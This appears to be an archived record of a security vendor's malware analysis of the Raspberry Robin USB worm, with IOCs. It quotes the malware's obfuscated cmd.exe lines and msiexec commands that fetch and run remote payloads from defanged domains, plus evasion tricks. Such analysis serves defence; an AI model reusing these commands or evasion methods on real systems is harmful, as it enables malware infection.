{
    "id": "86c0d6d1-614d-462b-9c25-590e2fc5117a",
    "created_at": "2023-01-12T14:59:39.398059Z",
    "updated_at": "2025-03-27T02:05:43.997184Z",
    "deleted_at": null,
    "sha1_hash": "a40efc5ad0d1b8e388b5d9ee255c6cc03e2da9b3",
    "title": "2022-05-12 - Suspicious DLL- Raspberry Robin-",
    "authors": "",
    "file_creation_date": "2022-05-28T23:31:56Z",
    "file_modification_date": "2022-05-28T23:31:56Z",
    "file_size": 184828,
    "plain_text": "# Suspicious DLL: Raspberry robin?\n\n**tehtris.com/en/blog/suspicious-dll-raspberry-robin/**\n\nMay 12, 2022\n\nTEHTRIS threat analyst team was following a new threat that raises lots of questions.\n\nSeeing the recent analysis published by RedCanary[1], we decided to publish our analysis to\ncontinue what they started: raising awareness about this threat and bringing visibility to this\nmalware.\n\nWe decided to keep the name Raspberry Robin to facilitate security researcher job.\n\nMost of our sample date from April/May 2022.\n\nWe don’t know yet if the threat is targeted toward some compagnies/sectors but in most\ncases, the industrial and service provider sectors were impacted. Moreover, it is\nrecommended for everyone to monitor that threat.\n\nThis threat seems to propagate like a worm. We haven’t seen proof of human activity at any\nstage during the analysis (for instance, searching for credential, data, lateral movement).\n\nIn every case, the entry point was always an infected USB key with a LNK file inside.\n\n## Initial Access\n\nLNK files are “shortcuts” for applications, the one present on the Desktop for instance,\nhowever, it is also possible to store entire command line (powershell, cmd, …).\n\n\n-----\n\nThe attack starts with a LNK file being executed from a USB drive. The naming convention of\nthe LNK file itself seems to mimic the USB drive name as seen in several cases:\n\n**E:\\Lexar.lnk**\n**D:\\KINGSTON.lnk**\n\nWe don’t know yet if the initial click results in human activity or a vulnerability or autorun like\nfunctionalities.\n\nWe don’t know yet how the LNK got on the USB key in the first place.\nWe don’t know yet if the USB key are purposely built to target some companies (USB keys\ndropped in a company parking lot) or if it comes from personal employees’ USB Key which\nwere already infected.\n\nWe haven’t had the chance to put our hands on an infected USB key. We do suspect that\nother files may exist in the USB key, but we do not have the proof by now.\n\n**Forensic: It’s possible to find traces of the LNK file in UserAssist keys of the user who**\nexecuted it.\n\n## First execution: CMD\n\nFor a majority of our samples, a command involving cmd.exe is executed. The command line\nis filled with spacing symbols (more that 200): ^I (tabulations), $ (new line) and regular\nspace. For the sake of visibility, they have been replaced with […].\n\nBelow, there are several examples as seen on several cases. Only one of those command\nlines is executed in each case, but we deemed important to show the variety of them.\n\n**“C:\\Windows\\System32\\cmd.exe”[…]/V/R cMd<HiVE.LNk:sb**\n**“C:\\Windows\\System32\\cmd.exe”[…]/V/R !COmsPEc!<qjM.cHK**\n**“C:\\Windows\\System32\\cmd.exe” /r[…]cMd<qJm.cHK**\n\nThe aim of the command seems to execute the command included in the file after the “<”.\n\nWe haven’t got our hand on one of those files, but we know:\n\n/R is the same as /C, probably to evade detection\n/V is for allowing the usage of “!” instead of “%” for environment variable. !comspec! is\nan environment variable pointing to cmd.exe full path (C:\\Windows\\system32\\cmd.exe\nfor instance).\nIn some cases, there is a probable evidence of ADS (Alternate Data Stream) usage as\ncould be seen in the first example after the “:”, probably to conceal the malicious\ncontent. ADS is a feature of NTFS filesystems only.\nThe usage of lower/upper case letter is aimed at hindering detections.\n\n\n-----\n\nThose command lines spawn two processes: an Explorer and a MSIExec.\n\n## Explorer & MSI\n\nExample of the Explorer :\n```\n                        exPLoREr KINgSTON\nExplOrEr \"VICTOR\"\n\n```\nFor now, we can only guess on the goal of the explorer. Given the meddling of lower/upper\ncases, it’s probably a voluntary action from the attacker. The command line opens the file\nexplorer in the drive, so it’s maybe to show the end-user that something happened: even if\nit’s a human name, we guess it’s the USB KEY name.\n\nExample of the MSIExec :\n```\n                        MsIExEc -Q /I \"HttP://jZM[.]pw:8080//?\"\nMSiEXEC /Q/I \"hTtp://b9[.]pm:8080//?\"\nMsieXec -Q-i \"hTtp://0Dz[.]me:8080//? \"\n\n```\n< REMOVED STRING > looks like S1TOapDC73i, different for each command line.\n\nAs seen previously, upper/lower case character are mixing, but the way the options are\nprovided changes too because / and – are both acceptable for parameter. For instance:\n```\n                        MsIExEc -Q-i\nMsieXec /Q/I\nMSiEXEC -Q /I \n\n```\nWith this command, msiexec can retrieve a payload on the Internet and execute it. It results\nin the following DLL installation.\n\n## DLL\n\nThe next stage takes the form of a DLL.\nAs for now, we have seen that each infection has its own instance of the DLL. Our\nhypothesis is that a new binary is generated for each infection.\n\nThe DLL install itself in one of the following directories:\n\n\n-----\n\n```\n                        C:\\ProgramData\\*\nC:\\Users\\\\AppData\\Local\\Temp\\*\nC:\\Program Files (x86)\\Common Files\\*\nC:\\Users\\\\AppData\\Local\\*\nC:\\Program Files (x86)\\*\n\n```\nThe final DLL is imbricated in 2 level of directory, for instance:\n```\n                        c:\\program files (x86)\\common files\\\\\\.dll \nc:\\users\\\\appdata\\local\\\\\\.dll\nC:\\ProgramData\\\\\\.dll\n\n```\n< STRING 1> looks like a probable but random program name, such as KeyInfo, TermDriver,\n…\n\n< STRING2 > looks more random, but still probable for an internal program directory like\nUdrateTask, Assonists, …\n\n< STRING3 > looks like random string, with [a-zA-Z0-9] separated with _ like\ntno8trami_topino.dll, AKAWAhopl_NET87.dll or momr_knte8_54.dll.\n\nWe observed that in the first level directory (STRING1), there were files from the hard drive\n(dll, bin, pptx, exe, …) that were being copied here. As the creation time and access time\nwere identical (even if it’s possible that they have been modified), we suppose it’s to mimic a\nnormal program repository, with all kinds of binaries, because a directory in\nProgramData\\Program Files with nothing inside is suspicious.\n\nAll the previous steps were conducted as the user responsible for plugging the USB Key and\nit’s the same for this DLL.\n\nAs seen previously, the DLL seems to follow a naming pattern, but it’s not a reliable means of\ndetection because divergences have been seen.\n\nThe DLL is launched with a rundll32 in most observed cases (but regasm has been seen\nused in a minority of cases)\n\n\n-----\n\n```\n                        C:\\WINDOWS\\SysWOW64\\RUNDLL32.EXE\nC:\\ProgramData\\\\\\.dll,\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe /silent /u “C:\\Program Files\n(x86)\\Common Files\\\\\\.dll” \n\n```\n< STRING4 > is the DLL entry point, it looks like < STRING3 >, a random string, with [a-zAZ0-9] separated with _.\n\nThe DLL is launched by a schedule task:\n```\n                        \\Microsoft\\Windows\\RemoteApp and Desktop\nConnections Update\\\n\n```\nThere are some legit scheduled tasks that start the same up to “update”, however <\nSTRING5 > is either a random string with [a-zA-Z] or a made up program name with like\nSystem.Windows.Orez.\n\nWe don’t know yet the method used to add the scheduled task.\n\n## Conclusion\n\nWe don’t have information about the goal or the target of the attacker behind this attack,\nhowever the threat has been detected in a wide number of countries from all around the\nworld. We strongly advise everyone to search for those IoCs (domain names, scheduled\ntasks, command line matching the one observed, …) and remediate the contaminated\ncomputers as soon as possible.\n\nWe will update the article should we have any new element.\n\n## IOC\n\n### DLL Sha256:\n\n1b7bb5278ea1bb8a1da525e035f4df3a4f8ea269967c40575f8bc71b896f8054\n\n### Domains:\n\n3h[.]WF\n\nv0[.]cx\n\nF0[.]tEL\n\n\n-----\n\nB9[.]pm\nK5m[.]co\nP9[.]TEL\nOj8[.]eU\n6y[.]Re\n0t[.]yt\nkr4[.]xyZ\n\n### Domains:\n\nSuspicious schedule task name:\n\n*RemoteApp and Desktop Connections Update*\n\n[1] [https://redcanary.com/blog/raspberry-robin/](https://redcanary.com/blog/raspberry-robin/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-05-12 - Suspicious DLL- Raspberry Robin-.pdf"
    ],
    "report_names": [
        "2022-05-12 - Suspicious DLL- Raspberry Robin-.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535579,
    "ts_updated_at": 1743041143,
    "ts_creation_date": 1653780716,
    "ts_modification_date": 1653780716,
    "files": {
        "pdf": "https://archive.orkl.eu/a40efc5ad0d1b8e388b5d9ee255c6cc03e2da9b3.pdf",
        "text": "https://archive.orkl.eu/a40efc5ad0d1b8e388b5d9ee255c6cc03e2da9b3.txt",
        "img": "https://archive.orkl.eu/a40efc5ad0d1b8e388b5d9ee255c6cc03e2da9b3.jpg"
    }
}